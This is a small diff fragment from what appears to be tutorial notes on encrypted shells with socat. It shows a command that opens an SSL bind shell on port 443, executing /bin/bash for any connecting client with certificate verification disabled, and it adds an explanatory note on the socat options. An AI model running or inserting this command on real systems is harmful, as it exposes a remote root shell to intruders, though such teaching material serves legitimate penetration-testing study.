@@ -210,3 +210,5 @@ cat bind_shell.key bind_shell.crt > bind_shell.pem
 ```bash
 sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem, verify=0,fork EXEC:/bin/bash
 ```
+
+_note:- We will use *-* to transfer data between STDIO and  *OPENSSL* to establish a remote SSL connection to Alice's listener, *verify=0* to disable SSL certificate verification_
